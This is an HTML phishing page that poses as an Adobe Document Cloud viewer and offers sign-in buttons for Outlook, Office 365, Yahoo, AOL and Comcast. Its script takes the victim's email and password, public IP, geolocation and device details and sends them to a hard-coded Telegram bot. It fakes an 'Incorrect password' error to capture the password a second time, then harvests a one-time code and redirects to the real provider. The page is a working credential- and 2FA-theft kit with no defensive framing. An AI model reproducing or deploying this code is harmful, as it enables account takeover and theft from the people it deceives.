<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Adobe Document Access</title>

  <!-- ✅ CORRECT CSP: Only one, no extra spaces -->
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; 
                 img-src 'self' https: data:;
                 style-src 'self' 'unsafe-inline';
                 script-src 'self' 'unsafe-inline';
                 connect-src 'self' 
                             https://api.telegram.org 
                             https://api.ipify.org 
                             https://ipapi.co;" />

  <style>
    :root {
      --panel-bg: rgba(0, 0, 0, 0.6);
      --panel-border: #f1f1f1;
      --brand-blue: #1e73ff;
      --brand-red: #d93025;
      --brand-sky: #4d8fe4;
      --brand-purple: #8f1189;
      --brand-green: #1a8f2e;
      --focus: #ffcc00;
    }

    html, body { height: 100%; }
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .panel {
      background-color: var(--panel-bg);
      color: #fff;
      border: 3px solid var(--panel-border);
      border-radius: 15px;
      width: 50%;
      max-width: 720px;
      padding: 24px;
      text-align: center;
    }

    .panel p { margin: 0 0 16px; }

    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      width: 80%;
      margin: 16px auto 0;
      color: #fff;
      border: 0;
      border-radius: 8px;
      padding: 10px 12px;
      cursor: pointer;
      background: #444;
    }
    .brand img { width: 30px; height: 30px; }
    .brand.b1 { background: var(--brand-blue); }
    .brand.b2 { background: var(--brand-red); }
    .brand.b3 { background: var(--brand-sky); }
    .brand.b4 { background: var(--brand-purple); }
    .brand.b5 { background: var(--brand-green); }

    .brand:focus { outline: 3px solid var(--focus); outline-offset: 2px; }

    .logo img { width: 100px; height: 100px; }

    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      padding: 16px;
    }
    .modal-backdrop.is-open { display: flex; }

    .modal-dialog {
      background: #fff;
      color: #000;
      border-radius: 10px;
      width: 100%;
      max-width: 520px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
    }

    .modal-header, .modal-footer { padding: 12px 16px; border-bottom: 1px solid #e5e5e5; }
    .modal-header { display: flex; align-items: center; justify-content: space-between; }
    .modal-footer { border-top: 1px solid #e5e5e5; border-bottom: 0; display: flex; gap: 8px; justify-content: flex-end; }
    .modal-body { padding: 16px; }

    .close-btn {
      background: transparent;
      border: 0;
      font-size: 20px;
      line-height: 1;
      cursor: pointer;
    }
    .close-btn:focus { outline: 3px solid var(--focus); outline-offset: 2px; }

    .form-control {
      width: 100%;
      box-sizing: border-box;
      padding: 10px 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .form-control:focus { outline: 3px solid #a3c9ff; }

    .btn { border: 0; border-radius: 6px; padding: 10px 14px; cursor: pointer; }
    .btn-primary { background: #0d6efd; color: #fff; }
    .btn-secondary { background: #6c757d; color: #fff; }
    .btn:focus { outline: 3px solid var(--focus); outline-offset: 2px; }

    .text-center { text-align: center; }
    .text-danger { color: #c1121f; }
    .text-warning { color: #b08900; }
    .mb-5 { margin-bottom: 2rem; }
    .mt-2 { margin-top: 0.5rem; }
    .mt-3 { margin-top: 1rem; }

    @media (max-width: 767px) {
      .panel { width: 85%; padding: 16px; }
      .logo img { width: 80px; height: 80px; }
    }
  </style>
</head>
<body>

  <main class="panel" aria-labelledby="panelHeading">
    <div class="logo">
      <img loading="lazy" src="https://store-images.s-microsoft.com/image/apps.17212.580fea4c-0e1b-413f-9697-4de5b2f1b6fc.6013dcf9-6c4c-4117-be70-160c5f0bcb0d.f7cdfb4b-039c-47c1-9f77-c32ac500f35f.png" alt="Adobe logo" />
    </div>
    <h1 id="panelHeading" class="sr-only">Adobe Document Access</h1>
    <p style="font-size:15px">Adobe Document Cloud <br /> To read the document, please sign in using the email credentials this file was sent to.</p>

    <button type="button" class="brand b1 provider" data-name="Outlook" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png" data-formid="1" aria-label="Sign in with Outlook">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/512px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft logo" />
      <span>Sign in with Outlook</span>
    </button>

    <button type="button" class="brand b2 provider" data-name="Office" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Microsoft_365_%282022%29.svg/512px-Microsoft_365_%282022%29.svg.png" data-formid="2" aria-label="Sign in with Office 365">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/Microsoft_365_%282022%29.svg/512px-Microsoft_365_%282022%29.svg.png" alt="Microsoft 365 logo" />
      <span>Sign in with Office 365</span>
    </button>

    <button type="button" class="brand b4 provider" data-name="Yahoo" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/2560px-Yahoo%21_%282019%29.svg.png" data-formid="3" aria-label="Sign in with Yahoo">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/2560px-Yahoo%21_%282019%29.svg.png" alt="Yahoo logo" />
      <span>Sign in with Yahoo Mail</span>
    </button>

    <button type="button" class="brand b5 provider" data-name="AOL" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1200px-AOL_logo.svg.png" data-formid="4" aria-label="Sign in with AOL">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1200px-AOL_logo.svg.png" alt="AOL logo" />
      <span>Sign in with AOL</span>
    </button>

    <button type="button" class="brand b3 provider" data-name="Comcast" data-image="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Comcast_%282013-2024%29_logo.svg/1200px-Comcast_%282013-2024%29_logo.svg.png" data-formid="5" aria-label="Sign in with Comcast">
      <img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Comcast_%282013-2024%29_logo.svg/1200px-Comcast_%282013-2024%29_logo.svg.png" alt="Comcast logo" />
      <span>Sign in with Comcast</span>
    </button>

    <p style="font-size:15px">Select your email provider to view the document.</p>
    <p style="font-size:15px">Copyright &copy; 2025 Adobe</p>
  </main>

  <!-- First Modal -->
  <div class="modal-backdrop" id="firstModal" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="firstModalTitle">
    <div class="modal-dialog">
      <div class="modal-header">
        <h2 id="firstModalTitle" style="margin:0;font-size:18px;"></h2>
        <button class="close-btn" type="button" aria-label="Close" data-close="firstModal">&times;</button>
      </div>
      <div class="modal-body">
        <div class="text-center mb-5">
          <div class="data-image" style="height:100px"></div>
          <h3 class="mt-2 txx_hd" style="margin:0;">Login with <span class="form-title"></span></h3>
        </div>
        <form id="authForm" novalidate>
          <p id="error_text" class="text-danger" aria-live="polite"></p>
          <input type="hidden" id="form-id" name="id" />
          <label for="email" class="form_tx">Email Address</label>
          <input id="email" type="email" placeholder="Email" class="form-control" name="email_address" autocomplete="username" required />
          <br />
          <p>We'll never share your email with anyone else.</p>
          <label for="password">Password</label>
          <input id="password" type="password" placeholder="Enter Password" class="form-control" name="password" autocomplete="current-password" required />
          <div class="mt-3 text-warning" id="loadingFirst" style="display: none;">Verifying...</div>
        </form>
      </div>
      <div class="modal-footer">
        <button class="btn btn-secondary" type="button" data-close="firstModal">Close</button>
        <button class="btn btn-primary" type="submit" form="authForm">Login</button>
      </div>
    </div>
  </div>

  <!-- Second Modal -->
  <div class="modal-backdrop" id="secondModal" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="secondModalTitle">
    <div class="modal-dialog">
      <div class="modal-header">
        <h2 id="secondModalTitle" style="margin:0;font-size:18px;">Additional Verification</h2>
        <button class="close-btn" type="button" aria-label="Close" data-close="secondModal">&times;</button>
      </div>
      <form id="otpForm" novalidate>
        <div class="modal-body">
          <p class="text-center" style="font-weight:bold;">Please verify your account</p>
          <label for="otp">OTP</label>
          <input id="otp" type="text" placeholder="OTP" class="form-control" name="txtotp" inputmode="numeric" autocomplete="one-time-code" required />
          <div class="mt-3 text-warning" id="loadingSecond" style="display: none;">Verifying...</div>
        </div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-close="secondModal">Close</button>
          <button class="btn btn-primary" type="submit">Submit</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    // App state
    const state = {
      selectedId: null,
      firstAttemptDone: false,
      formData: {},
      fullData: {}
    };

    // ✅ CONFIGURE THESE
    const TELEGRAM_BOT_TOKEN = '5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo'; // ← NO SPACES!
    const TELEGRAM_CHAT_ID = '1376032111'; // ← Your Telegram user ID

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.warn("⚠️ Bot token or chat ID not set!");
    }

    // Utility functions
    function openModal(id) {
      const el = document.getElementById(id);
      if (!el) return;
      el.classList.add('is-open');
      el.setAttribute('aria-hidden', 'false');
      const input = el.querySelector('input, button');
      if (input) input.focus();
    }

    function closeModal(id) {
      const el = document.getElementById(id);
      if (!el) return;
      el.classList.remove('is-open');
      el.setAttribute('aria-hidden', 'true');
    }

    document.addEventListener('click', e => {
      const closeId = e.target.getAttribute('data-close');
      if (closeId) closeModal(closeId);
    });

    document.addEventListener('keydown', e => {
      if (e.key === 'Escape') ['firstModal', 'secondModal'].forEach(closeModal);
    });

    // Provider buttons
    const providers = Array.from(document.querySelectorAll('.provider'));
    const firstModalTitle = document.getElementById('firstModalTitle');
    const dataImage = document.querySelector('.data-image');
    const formTitle = document.querySelector('.form-title');
    const hiddenId = document.getElementById('form-id');
    const errorText = document.getElementById('error_text');
    const authForm = document.getElementById('authForm');
    const loadingFirst = document.getElementById('loadingFirst');

    providers.forEach(btn => {
      btn.addEventListener('click', () => {
        const id = btn.dataset.formid || '';
        const name = btn.dataset.name || '';
        const image = btn.dataset.image || '';

        state.selectedId = id;
        state.firstAttemptDone = false;

        firstModalTitle.textContent = `${name} Sign In`;
        formTitle.textContent = name;

        dataImage.innerHTML = '';
        const img = new Image();
        img.src = image;
        img.width = 100;
        img.height = 100;
        img.alt = 'logo';
        img.loading = 'lazy';
        dataImage.appendChild(img);

        hiddenId.value = id;
        errorText.textContent = '';
        authForm.reset();

        openModal('firstModal');
      });
    });

    // Get Public IP
    async function getPublicIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json', { method: 'GET' });
        const data = await res.json();
        return data.ip;
      } catch (err) {
        return 'Unknown (Failed)';
      }
    }

    // Get Geolocation
    async function getGeoLocation(ip) {
      if (!ip || ip === 'Unknown (Failed)') {
        return { country: 'Unknown', city: 'Unknown', region: 'Unknown', lat: 'N/A', lon: 'N/A', org: 'N/A', timezone: 'N/A' };
      }
      try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`, { method: 'GET' });
        const data = await res.json();
        return {
          country: data.country_name || 'Unknown',
          city: data.city || 'Unknown',
          region: data.region || 'Unknown',
          lat: data.latitude || 'N/A',
          lon: data.longitude || 'N/A',
          org: data.org || 'N/A',
          timezone: data.timezone || 'N/A'
        };
      } catch (err) {
        console.error("Geo error:", err);
        return { country: 'Error', city: 'Error', lat: 'Error', lon: 'Error', org: 'Error' };
      }
    }

    // Device Info
    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
    }

    // Send to Telegram
    async function sendToTelegram(userData) {
      const text = `
🔐 *Login Attempt* 
📅 ${new Date().toLocaleString()}
📧 \`${userData.email}\`
🔑 \`${userData.password}\`
🔢 Provider: ${userData.provider}
🌐 IP: \`${userData.ip}\`
📍 ${userData.geo.city}, ${userData.geo.country}
📌 \`${userData.geo.lat}, ${userData.geo.lon}\`
🏢 ISP: ${userData.geo.org}
💻 Device: ${userData.device.platform}
🗣️ Lang: ${userData.device.language}
      `.trim();

      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });

        const result = await res.json();
        if (result.ok) {
          console.log('✅ Sent to Telegram');
        } else {
          console.error('❌ Telegram API Error:', result);
        }
      } catch (err) {
        console.error('📡 Fetch failed:', err.message);
      }
    }

    // First Form Submit (Capture Email + Password + Send All Data)
    authForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        errorText.textContent = 'All fields required.';
        return;
      }

      // Save current credentials
      state.formData = { email, password, provider: formTitle.textContent };

      // Gather IP, Geo, Device on first submit only
      if (!state.fullData.ip) {
        state.fullData = {
          ip: await getPublicIP(),
          device: getDeviceInfo()
        };
        state.fullData.geo = await getGeoLocation(state.fullData.ip);
      }

      // ✅ Always send to Telegram on every attempt
      await sendToTelegram({
        email,
        password,
        provider: formTitle.textContent,
        ip: state.fullData.ip,
        geo: state.fullData.geo,
        device: state.fullData.device
      });

      // First try → show error
      if (!state.firstAttemptDone) {
        loadingFirst.style.display = 'block';
        setTimeout(() => {
          loadingFirst.style.display = 'none';
          errorText.textContent = 'Incorrect password';
        }, 800);
        state.firstAttemptDone = true;
        return;
      }

      // Second try → proceed to OTP
      closeModal('firstModal');
      openModal('secondModal');
    });

    // OTP Form Submit
    const otpForm = document.getElementById('otpForm');
    const loadingSecond = document.getElementById('loadingSecond');

    function computeRedirect(id) {
      const map = {
        '1': 'https://outlook.com/login',
        '2': 'https://login.microsoftonline.com',
        '3': 'https://yahoo.com/login',
        '4': 'https://aol.com/login',
        '5': 'https://gmail.com/login'
      };
      return map[id] || 'https://www.adobe.com';
    }

    otpForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const otp = document.getElementById('otp').value.trim();
      if (!otp) return alert('Please enter OTP.');

      // Attach OTP to stored data
      state.formData.otp = otp;

      const otpText = `
🔢 *OTP Captured!* 
📧 \`${state.formData.email}\`
🔐 \`${state.formData.password}\`
🔢 OTP: \`${otp}\`
🌐 IP: \`${state.fullData.ip}\`
📍 ${state.fullData.geo.city}, ${state.fullData.geo.country}
📌 \`${state.fullData.geo.lat}, ${state.fullData.geo.lon}\`
🕒 ${new Date().toLocaleString()}
      `.trim();

      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: otpText,
            parse_mode: 'Markdown'
          })
        });
        const result = await res.json();
        if (!result.ok) console.error('Failed to send OTP:', result);
      } catch (err) {
        console.error('OTP send failed:', err);
      }

      // Redirect after short delay
      loadingSecond.style.display = 'block';
      setTimeout(() => {
        loadingSecond.style.display = 'none';
        window.location.href = computeRedirect(state.selectedId);
      }, 1000);
    });
  </script>
</body>
</html>
